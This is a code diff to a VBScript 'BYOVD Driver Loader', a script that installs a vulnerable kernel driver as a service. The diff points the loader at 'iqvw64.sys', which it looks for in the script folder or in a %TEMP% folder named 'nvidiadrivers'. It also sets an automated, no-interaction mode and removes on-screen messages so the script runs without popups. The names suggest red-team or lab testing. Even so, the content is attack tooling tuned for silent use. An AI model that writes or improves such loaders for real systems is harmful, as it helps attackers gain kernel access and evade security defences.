@@ -12,14 +12,30 @@ Dim strDriverPath, strServiceName, strLogPath
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-strDriverPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\nvidiadrivers\test_driver.sys"
-strServiceName = "TestVulnDriver"
-strLogPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\driver_loader.log"
+' Determine the correct driver path - check both possible locations
+Dim strCurrentDir, strDriverPath1, strDriverPath2
+strCurrentDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
+strDriverPath1 = objFSO.BuildPath(strCurrentDir, "iqvw64.sys")
+strDriverPath2 = objShell.ExpandEnvironmentStrings("%TEMP%") & "\nvidiadrivers\iqvw64.sys"
+
+If objFSO.FileExists(strDriverPath1) Then
+    strDriverPath = strDriverPath1
+ElseIf objFSO.FileExists(strDriverPath2) Then
+    strDriverPath = strDriverPath2
+Else
+    strDriverPath = strDriverPath1 ' Default to script directory
+End If
+
+strServiceName = "BYOVDTestDriver"
+strLogPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\driver_loader_" & Replace(Replace(Replace(Now(), "/", ""), ":", ""), " ", "_") & ".log"
 
 ' Main execution
 Sub LoadDriver()
     LogMsg "BYOVD Driver Loader Started"
     LogMsg "Target Driver: " & strDriverPath
+    LogMsg "Service Name: " & strServiceName
+    LogMsg "Log File: " & strLogPath
+    LogMsg "Running in automated mode - no user interaction required"
     
     ' Check if driver file exists
     If Not objFSO.FileExists(strDriverPath) Then
@@ -167,7 +183,7 @@ Sub LogMsg(strMessage)
     objLogFile.WriteLine FormatDateTime(Now(), 0) & " - " & strMessage
     objLogFile.Close
     
-    WScript.Echo strMessage
+    ' WScript.Echo removed to prevent Windows Script Host popups
 End Sub
 
 ' Execute
